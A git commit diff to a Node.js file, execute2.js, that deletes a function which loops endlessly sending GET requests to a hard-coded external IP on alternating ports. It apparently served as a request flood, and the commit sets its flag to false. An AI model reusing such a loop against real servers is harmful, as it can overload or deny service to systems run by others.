ea9bb22a73b88a9da20abbcc7fbd9326cd30abaa
Ryuzaki <lod.skot@gmail.com>
2022-04-17 03:21:22 +0400

    Update execute2.js

--- execute2.js
+++ execute2.js
@@ -1,16 +1,1 @@
-const axios = require("axios");
-
-global.app.request1 = true;
-const sendRequest1 = () => {
-    if ("request1" in global.app == false || global.app.request1 == false) {
-        return;
-    }
-    axios.get("http://195.18.27.252:2801" + (Date.now() % 2 == 0 ? "6" : "8") + "/", {timeout: 1000}).then(res => {
-        console.log("Res: ", res);
-    }).catch((err) => {
-        console.log("Err:", err.toString());
-    }).finally(() => {
-        sendRequest1();
-    });
-};
-sendRequest1();
+global.app.request1 = false;
